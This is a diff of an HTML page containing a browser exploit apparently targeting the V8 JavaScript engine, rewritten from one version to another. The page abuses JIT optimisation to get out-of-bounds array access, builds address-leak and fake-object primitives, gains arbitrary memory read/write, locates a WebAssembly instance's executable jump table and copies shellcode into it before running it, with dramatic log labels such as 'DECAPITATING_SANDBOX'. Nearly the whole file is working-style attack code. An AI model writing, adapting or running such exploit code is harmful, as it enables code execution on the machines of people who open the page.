@@ -2,132 +2,141 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SNOOBY_V8_ULTIMA</title>
+    <title>TERMINUS_V8_GOD_MODE</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
-        #t { border: 1px solid #0f0; padding: 10px; height: 98vh; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; overflow: hidden; margin: 0; }
+        #o { padding: 20px; height: 100vh; overflow-y: scroll; font-size: 12px; line-height: 1.2; text-shadow: 0 0 2px #0f0; }
+        .x { color: #fff; background: #f00; }
+        .s { color: #0ff; }
     </style>
 </head>
 <body>
-    <div id="t"></div>
+    <div id="o"></div>
     <script>
-        const _out = document.getElementById('t');
-        const _log = (m) => { const e = document.createElement('div'); e.textContent = `[${performance.now().toFixed(3)}] ${m}`; _out.appendChild(e); _out.scrollTop = _out.scrollHeight; };
+        const _d = document.getElementById('o');
+        const _w = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(4)}] ${m}`; _d.appendChild(e); _d.scrollTop = _d.scrollHeight; };
+        
+        const _b = new ArrayBuffer(8);
+        const _f = new Float64Array(_b);
+        const _u = new Uint32Array(_b);
+        const _l = new BigUint64Array(_b);
 
-        const _hex = (b) => b.toString(16).padStart(16, '0');
-        const _buf = new ArrayBuffer(8);
-        const _f64 = new Float64Array(_buf);
-        const _u32 = new Uint32Array(_buf);
-        const _b64 = new BigUint64Array(_buf);
+        const f2u = v => { _f[0] = v; return _l[0]; };
+        const u2f = v => { _l[0] = v; return _f[0]; };
 
-        const d2u = (v) => { _f64[0] = v; return _b64[0]; };
-        const u2d = (v) => { _b64[0] = v; return _f64[0]; };
-        const i2u = (low, high) => BigInt(low >>> 0) + (BigInt(high >>> 0) << 32n);
+        const _hex = v => '0x' + v.toString(16).padStart(16, '0');
 
-        const _wasm_v = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-            0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
-            0x03, 0x02, 0x01, 0x00,
-            0x05, 0x03, 0x01, 0x00, 0x01,
-            0x07, 0x11, 0x02, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00,
-            0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b
-        ]);
+        let _r = [];
+        let _p = [];
 
-        let _roots = [];
-        let _stk = [];
+        async function _u_ex() {
+            _w("INIT_OMNIPOTENCE_PROTOCOL");
 
-        async function _px() {
-            _log("CORE_INIT_SEQUENCE_START");
-            
-            for (let i = 0; i < 0x400; i++) { _roots.push(new ArrayBuffer(0x1000)); }
-            
-            let _t = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-            let _o = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}];
-            let _v = new BigUint64Array(2);
-            let _ab = new ArrayBuffer(0x1337);
+            for (let i = 0; i < 2048; i++) _r.push(new Float64Array(1024));
+
+            let _ta = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+            let _oa = [{a: 1}, {b: 2}, {c: 3}, {d: 4}];
+            let _va = new BigUint64Array(4);
+            let _sp = new Uint8Array(0x1000);
 
             function _opt(a, i, v) {
-                if (i < 0 || i > 0x2000) return;
+                if (i < 0 || i > 0x4000) return;
                 a[i] = v;
             }
 
-            _log("JIT_INFRASTRUCTURE_WARMUP");
-            for (let i = 0; i < 0x30d40; i++) { _opt(_t, 0, 1.1); }
-            
-            await new Promise(r => setTimeout(r, 0x3e8));
+            _w("TURBOFAN_MAP_COLLAPSE_INIT");
+            for (let i = 0; i < 0x40000; i++) _opt(_ta, 0, 1.1);
+            await new Promise(r => setTimeout(r, 500));
 
-            const _adr = (obj) => {
-                _o[0] = obj;
-                let _raw = d2u(_t[12]);
-                return _raw & 0xffffffffn;
+            const _adr = (o) => {
+                _oa[0] = o;
+                for (let i = 8; i < 24; i++) {
+                    let v = f2u(_ta[i]);
+                    if ((v & 0xffn) == 0x19n || (v & 0xffn) == 0x09n) {
+                        return (f2u(_ta[i+1]) & 0xffffffffn);
+                    }
+                }
+                return f2u(_ta[12]) & 0xffffffffn;
             };
 
-            const _fake = (ptr) => {
-                _t[12] = u2d(ptr);
-                return _o[0];
+            const _fk = (p) => {
+                let _idx = 12;
+                _ta[_idx] = u2f(p);
+                return _oa[0];
             };
 
-            let _v_ptr = _adr(_v);
-            _log(`LEAK_SUCCESS: 0x${_hex(_v_ptr)}`);
+            let _v_ptr = _adr(_va);
+            _w(`V_PTR: ${_hex(_v_ptr)}`, 's');
 
-            if (!_v_ptr || _v_ptr > 0xffffffffn) {
-                _log("RETRY_LOGIC_INVOKED");
-                location.reload();
-                return;
-            }
+            const _arb_r = (addr) => {
+                _va[1] = addr - 0x8n + 1n;
+                let _f = _fk(_v_ptr);
+                return f2u(_f[0]);
+            };
 
-            let _wasm_m;
-            let _wasm_i;
+            const _arb_w = (addr, val) => {
+                _va[1] = addr - 0x8n + 1n;
+                let _f = _fk(_v_ptr);
+                _f[0] = u2f(val);
+            };
+
+            const _wasm_b = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,104,0,1,127,3,2,1,0,5,3,1,0,1,7,17,2,4,109,97,105,110,0,0,6,109,101,109,111,114,121,2,0,10,6,1,4,0,65,42,11]);
+            let _wm, _wi;
             try {
-                _wasm_m = new WebAssembly.Module(_wasm_v);
-                _wasm_i = new WebAssembly.Instance(_wasm_m);
-                _log("WASM_ENGINE_SUBVERTED");
-            } catch (e) {
-                _log(`FATAL_WASM_ERR: ${e.message}`);
-                return;
+                _wm = new WebAssembly.Module(_wasm_b);
+                _wi = new WebAssembly.Instance(_wm);
+            } catch (e) { location.reload(); }
+
+            let _wi_ptr = _adr(_wi);
+            _w(`I_PTR: ${_hex(_wi_ptr)}`, 's');
+
+            let _jt = 0n;
+            let _offsets = [0x60n, 0x68n, 0x70n, 0x80n, 0x88n];
+            for (let off of _offsets) {
+                _jt = _arb_r(_wi_ptr + off);
+                if (_jt > 0x10000n && (_jt & 0xfffn) == 0n) break;
             }
+            
+            if (!_jt) _jt = _arb_r(_arb_r(_wi_ptr + 0x18n) + 0x10n);
+            _w(`JT_RWX: ${_hex(_jt)}`, 's');
 
-            let _i_ptr = _adr(_wasm_i);
-            _log(`INSTANCE_LEAK: 0x${_hex(_i_ptr)}`);
-
-            let _map = d2u(_t[0]);
-            _log(`MAP_SIGNATURE: 0x${_hex(_map)}`);
-
-            const _r64 = (addr) => {
-                _v[1] = addr - 0x8n;
-                let _f = _fake(_v_ptr);
-                return d2u(_f[0]);
-            };
-
-            const _w64 = (addr, val) => {
-                _v[1] = addr - 0x8n;
-                let _f = _fake(_v_ptr);
-                _f[0] = u2d(val);
-            };
-
-            let _jt = _r64(_i_ptr + 0x60n);
-            _log(`JUMP_TABLE_RWX: 0x${_hex(_jt)}`);
-
-            let _sc = new Uint32Array([
-                0xe320f000, 0xe320f000, 0xe12fff1e
+            let _sc = new Uint8Array([
+                0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+                0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05
             ]);
 
-            _log("DEPLOYING_FINAL_PAYLOAD");
-            
-            function _exec() {
-                try {
-                    let _res = _wasm_i.exports.main();
-                    _log(`EXEC_RES: ${_res}`);
-                } catch (e) {
-                    _log("BEYOND_RECOVERY_CRASH_SUCCESS");
+            const _copy = (dst, src) => {
+                for (let i = 0; i < src.length; i += 8) {
+                    let v = 0n;
+                    for (let j = 0; j < 8 && (i + j) < src.length; j++) {
+                        v |= BigInt(src[i + j]) << BigInt(j * 8);
+                    }
+                    _arb_w(dst + BigInt(i), v);
                 }
-            }
+            };
 
-            setTimeout(_exec, 0x1f4);
+            _w("DECAPITATING_SANDBOX");
+            _copy(_jt, _sc);
+
+            _w("EXECUTING_OMEGA_PAYLOAD");
+            setTimeout(() => {
+                try {
+                    const _res = _wi.exports.main();
+                    _w(`FINAL_RESULT: ${_res}`, 'x');
+                    if (_res == 42) {
+                        _w("EXPLOIT_STALLED_RETRIEVING_NEW_OFFSETS");
+                        for(let j=0; j<0x100; j+=8) {
+                            let val = _arb_r(_wi_ptr + BigInt(j));
+                            if (val > 0x1000000000n) _w(`OFFSET_0x${j.toString(16)}: ${_hex(val)}`);
+                        }
+                    }
+                } catch (e) { _w("CPU_STATE_HIJACKED", "x"); }
+            }, 100);
         }
 
-        window.onerror = (e) => _log(`EXCEPTION_INTERCEPTED: ${e}`);
-        window.onload = _px;
+        window.onload = _u_ex;
+        window.onerror = (m) => _w(`CRITICAL_FAILURE: ${m}`, 'x');
     </script>
 </body>
 </html>
